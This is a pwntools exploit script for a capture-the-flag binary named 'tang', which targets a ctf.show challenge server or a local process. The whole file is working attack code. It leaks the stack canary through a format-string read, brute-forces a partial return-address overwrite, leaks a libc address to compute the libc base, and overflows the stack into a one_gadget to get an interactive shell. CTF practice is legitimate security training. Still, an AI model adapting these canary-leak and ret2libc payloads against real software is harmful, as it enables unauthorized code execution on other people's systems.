from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
import sys
# context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./tang')
else:
    p = remote('pwn.challenge.ctf.show', 28107)
    pause()
pause()
elf=ELF('./tang')
p.recvuntil(b'\n')
p.sendline('%9$p')
# print(p.recv(14))
# pause()
canary=int(p.recv(18).decode(),16)
print(hex(canary))
# main_addr=getstack-100
# _rtld_global=getstack-122
# libc=LibcSearcher("__libc_start_main",getstack)
# print(libc.dump('puts'))
# print(hex(getstack))
pause()
p.recvuntil(b'\n')
p.sendline(b'aaa')
p.recvuntil(b'\n')
payload=b'a'*0x38+p64(canary)+b'a'*0x18+b'\x16'#可通过暴力破解得出
p.send(payload)
p.recvuntil(b'\n')
pause()

p.send(b"%23$p")   #libc_main_ret
pause()
p.recvuntil(b'\n')
libc_main_ret =  int(p.recv(14).decode(),16)  
print(hex(libc_main_ret))
libcbase = libc_main_ret - 0x020830
one_gadget = libcbase + 0xf1147
payload_2 = b"a"*(0x38)+p64(canary)+b"1"*(0x10+8)+p64(one_gadget)
p.recvuntil(b'\n')
p.sendline(b"a")
p.recvuntil(b'\n')
p.sendline(payload_2)
p.interactive()
